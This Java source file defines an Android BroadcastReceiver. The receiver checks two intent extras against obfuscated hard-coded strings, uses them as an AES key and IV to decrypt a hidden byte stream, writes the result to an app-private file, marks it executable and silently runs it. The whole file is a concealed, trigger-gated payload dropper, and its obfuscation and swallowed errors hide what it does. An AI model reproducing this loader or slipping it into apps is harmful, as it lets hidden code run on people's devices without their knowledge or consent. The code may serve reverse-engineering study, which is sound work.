package com.example.something;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * Created by cthompson on 7/1/17.
 */

public class Pooper extends BroadcastReceiver {

    private BufferedInputStream bis;

    public Pooper(BufferedInputStream _bis) {
        bis = _bis;
    }

    public boolean checkSomething1(String a) {
        boolean didSomething = true;
        for (int i = 0; i < a.length(); i++) {
            switch(a.charAt(i)) {
                case 'b':
                    if (i != 0 && i != 4 && i != 8 && i != 12) {
                        didSomething = false;
                    }
                    break;
                case '1':
                    if (i != 1) {
                        didSomething = false;
                    }
                    break;
                case 'a':
                    if (i != 2) {
                        didSomething = false;
                    }
                    break;
                case 'h':
                    if (i != 3 && i != 7 && i != 11) {
                        didSomething = false;
                    }
                    break;
                case 'l':
                    if (i != 5 && i != 9 && i != 13) {
                        didSomething = false;
                    }
                    break;
                case '4':
                    if (i != 6 && i != 10) {
                        didSomething = false;
                    }
                    break;
                case 'o':
                    if (i != 14) {
                        didSomething = false;
                    }
                    break;
                case 'p':
                    if (i != 15) {
                        didSomething = false;
                    }
                    break;
                default:
                    didSomething = false;
            }
        }
        return didSomething;
    }

    public boolean checkSomething2(String a) {
        boolean didSomething = true;
        for (int i = 0; i < a.length(); i++) {
            switch(a.charAt(i)) {
                case 'm':
                    if (i != 0 && i != 1 && i != 3) {
                        didSomething = false;
                    }
                    break;
                case 'h':
                    if (i != 2 && i != 5) {
                        didSomething = false;
                    }
                    break;
                case 't':
                    if (i != 10 && i != 4) {
                        didSomething = false;
                    }
                    break;
                case 'i':
                    if (i != 6) {
                        didSomething = false;
                    }
                    break;
                case 's':
                    if (i != 7 && i != 15) {
                        didSomething = false;
                    }
                    break;
                case 'd':
                    if (i != 8 && i != 14) {
                        didSomething = false;
                    }
                    break;
                case 'a':
                    if (i != 9) {
                        didSomething = false;
                    }
                    break;
                case 'g':
                    if (i != 11) {
                        didSomething = false;
                    }
                    break;
                case 'o':
                    if (i != 12 && i != 13) {
                        didSomething = false;
                    }
                    break;
                default:
                    didSomething = false;
            }
        }
        return didSomething;
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        String thing1 = intent.getStringExtra("herpaderp");
        String thing2 = intent.getStringExtra("lerpaherp");

        if (!checkSomething1(thing1) || !checkSomething2(thing2)) {
            System.exit(0);
        }

        BufferedOutputStream soWriter;

        // TODO: password vs key
        final File soInternalStoragePath = new File(context.getDir("dex", Context.MODE_PRIVATE),
                "super-dooper");
        soInternalStoragePath.delete();

        try {
            soWriter = new BufferedOutputStream(new FileOutputStream(soInternalStoragePath));

            byte[] buf = new byte[bis.available()];
            bis.read(buf);
            byte[] dec = decrypt(thing1, thing2, buf);
            soWriter.write(dec);

            soWriter.close();
            bis.close();
        } catch (IOException e) {}

        soInternalStoragePath.setExecutable(true);

        try {
            Runtime.getRuntime().exec(soInternalStoragePath.getAbsolutePath());
        } catch (Exception e) {
            //Log.i("PooperReceiver", "Uh oh: " + e.getLocalizedMessage());
        }
    }

    public static byte[] decrypt(String key, String initVector, byte[] encrypted) {
        try {
            IvParameterSpec iv = new IvParameterSpec(initVector.getBytes("UTF-8"));
            SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes("UTF-8"), "AES");

            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5PADDING");
            cipher.init(Cipher.DECRYPT_MODE, skeySpec, iv);

            byte[] original = cipher.doFinal(encrypted);

            return original;
        } catch (Exception ex) {
            ex.printStackTrace();
        }

        return null;
    }
}
